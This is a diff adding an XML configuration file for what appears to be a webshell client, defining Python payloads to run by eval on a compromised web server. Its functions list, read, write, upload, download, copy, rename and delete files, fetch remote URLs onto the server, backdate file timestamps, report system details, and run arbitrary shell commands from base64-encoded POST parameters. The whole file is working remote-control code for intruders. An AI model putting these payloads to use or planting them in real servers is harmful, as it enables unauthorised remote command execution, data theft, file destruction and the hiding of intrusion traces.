@@ -1,0 +1,188 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<customShellType>
+  <funcCodeSetting>
+    <func>
+      <name>WwwRootPathCode</name>
+	  <type>pythonEval</type>
+	  <path>/FileManager</path>
+      <item><![CDATA[import os
+r=os.path.dirname(__file__)
+r+='\t'
+if r[0]!='/':
+    for disk in (chr(i+ord('A'))+':' for i in xrange(26)):
+        if os.path.exists(disk):
+            r+=disk+' '
+res+=r]]></item>
+    </func>
+    <func>
+      <name>FileTreeCode</name>
+	  <type>pythonEval</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
+      <item><![CDATA[import os,time
+d=base64.b64decode(request.POST.get('$dirPath$'))
+if not os.path.isdir(d):
+    res+="ERROR://Path Not Found Or No Permission"
+else:
+    for obj in os.listdir(d):
+        p=d+'/'+obj
+        t=time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(os.path.getmtime(p)))
+        s=str(os.path.getsize(p))
+        e=oct(os.stat(p).st_mode)[-4:]
+        if os.path.isdir(p):
+            obj+='/'
+        res+=obj+'\t'+t+'\t'+s+'\t'+e+'\n']]></item>
+    </func>
+    <func>
+      <name>ReadFileCode</name>
+	  <type>pythonEval</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
+      <item><![CDATA[d=base64.b64decode(request.POST.get('$filePath$'))
+f=open(d,'r')
+res+=f.read()
+f.close()]]></item>
+    </func>
+    <func>
+      <name>WriteFileCode</name>
+	  <type>pythonEval</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >fileContext</funcParam>
+      <item><![CDATA[import os
+d=base64.b64decode(request.POST.get('$filePath$'))
+buf=base64.b64decode(request.POST.get('$fileContext$'))
+f=open(d,'w')
+f.write(buf)
+f.close()
+res+=('1' if os.path.exists(d) else '0')]]></item>
+    </func>
+    <func>
+      <name>DeleteFileOrDirCode</name>
+	  <type>pythonEval</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
+      <item><![CDATA[import os,shutil
+d=base64.b64decode(request.POST.get('$fileOrDirPath$'))
+if os.path.isdir(d):
+    shutil.rmtree(d)
+else:
+    os.remove(d)
+res+=('0' if os.path.exists(d) else '1')]]></item>
+    </func>
+    <func>
+      <name>DownloadFileCode</name>
+	  <type>pythonEval</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
+      <item><![CDATA[d=base64.b64decode(request.POST.get('$filePath$'))
+f=open(d,'rb')
+res+=f.read()
+f.close()]]></item>
+    </func>
+    <func>
+      <name>UploadFileCode</name>
+	  <type>pythonEval</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >savefilePath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >fileHexContext</funcParam>
+      <item><![CDATA[import os
+d=base64.b64decode(request.POST.get('$savefilePath$'))
+c=base64.b64decode(request.POST.get('$fileHexContext$'))
+f=open(d,'wb')
+f.write(c.decode('hex'))
+f.close()
+res+=('1' if os.path.exists(d) else '0')]]></item>
+    </func>
+    <func>
+      <name>CopyFileOrDirCode</name>
+	  <type>pythonEval</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >sourceFilePath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >targetFilePath</funcParam>
+      <item><![CDATA[import os,shutil
+s=base64.b64decode(request.POST.get('$sourceFilePath$'))
+d=base64.b64decode(request.POST.get('$targetFilePath$'))
+if os.path.isdir(s):
+    shutil.copytree(s,d)
+    res+=('1' if os.path.isdir(d) else '0')
+else:
+    shutil.copy(s,d)
+    res+=('1' if os.path.isfile(d) else '0')]]></item>
+    </func>
+    <func>
+      <name>RenameFileOrDirCode</name>
+	  <type>pythonEval</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >oldName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >newName</funcParam>
+      <item><![CDATA[import os
+s=base64.b64decode(request.POST.get('$oldName$'))
+d=base64.b64decode(request.POST.get('$newName$'))
+os.rename(s,d)
+res+=('1' if os.path.exists(d) else '0')]]></item>
+    </func>
+    <func>
+      <name>CreateDirCode</name>
+	  <type>pythonEval</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
+      <item><![CDATA[import os
+s=base64.b64decode(request.POST.get('$dirPath$'))
+os.mkdir(s)
+res+=('1' if os.path.isdir(s) else '0')]]></item>
+    </func>
+    <func>
+      <name>ModifyFileOrDirTimeCode</name>
+	  <type>pythonEval</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >aTime</funcParam>
+      <item><![CDATA[import os,time
+s=base64.b64decode(request.POST.get('$fileOrDirPath$'))
+t=base64.b64decode(request.POST.get('$aTime$'))
+tt=time.mktime(time.strptime(t,'%Y-%m-%d %H:%M:%S'))
+os.utime(s,(tt,tt))
+res+='1']]></item>
+    </func>
+    <func>
+      <name>WgetCode</name>
+	  <type>pythonEval</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >urlPath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >saveFilePath</funcParam>
+      <item><![CDATA[import os,urllib2
+r=base64.b64decode(request.POST.get('$urlPath$'))
+l=base64.b64decode(request.POST.get('$saveFilePath$'))
+u=urllib2.urlopen(r)
+f=open(l,'wb')
+f.write(u.read())
+f.close()
+res+=('1' if os.path.exists(l) else '0')]]></item>
+    </func>
+    <func>
+      <name>ExecuteCommandCode</name>
+	  <type>pythonEval</type>
+	  <path>/Cmder</path>
+	  <funcParam location="Body" encrymode="Base64" >cmdPath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >command</funcParam>
+      <item><![CDATA[import os,subprocess
+p=base64.b64decode(request.POST.get('$cmdPath$'))
+s=base64.b64decode(request.POST.get('$command$'))
+c='{0} {1}'.format(('-c' if os.sep=='/' else '/c'),s)
+p=subprocess.Popen(p+' '+c,shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+res+="".join(p.stdout.readlines())]]></item>
+    </func>
+    <func>
+      <name>SysInfoCode</name>
+	  <type>pythonEval</type>
+	  <path>/Cmder</path>
+      <item><![CDATA[import os,platform
+r=os.path.abspath(__file__)
+sn='-'.join(platform.uname())
+su=request.META.items()[30][1] or 'unknown'
+separator=os.sep
+res+=r+'\t'+sn+'\t'+su+'\t'+separator]]></item>
+    </func>
+  </funcCodeSetting>
+</customShellType>
